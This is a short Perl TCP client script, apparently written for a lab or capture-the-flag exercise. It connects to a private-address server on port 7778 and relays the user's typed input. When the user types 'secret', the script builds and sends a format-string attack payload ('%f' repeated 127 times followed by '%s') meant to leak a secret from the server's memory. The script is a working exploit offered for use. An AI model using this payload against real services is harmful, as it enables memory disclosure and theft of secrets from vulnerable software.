#!/usr/bin/perl
#tcpclient.pl

use IO::Socket;

$socket = new IO::Socket::INET (
                                  PeerAddr  => '10.10.10.11',
                                  PeerPort  =>  7778,
                                  Proto => 'tcp',
                               )                
or die "Couldn't connect to Server\n";


while (1) {
	
	$socket->recv($recv_data,1024);
	print "RECIEVED: $recv_data"; 
        print "\nSEND(TYPE quit to Quit or TYPE secret to get the secret):";
        
        $send_data = <STDIN>;
        $tmp=$send_data;
	chop($tmp); # get rid of new line
              
        
        if ($tmp eq 'quit') {
	        $socket->send($send_data);
            	close $socket;
            	last;
        }
	elsif ($tmp eq 'secret') {
		print "Getting secret...\n";
		my $secret_1 = "%f";
		my $secret_2 = ($secret_1 x 127) . "%s test\n";
		print "$secret_2";
	        $socket->send($secret_2);
        }    else {
	        $socket->send($send_data);
        }
}    
    
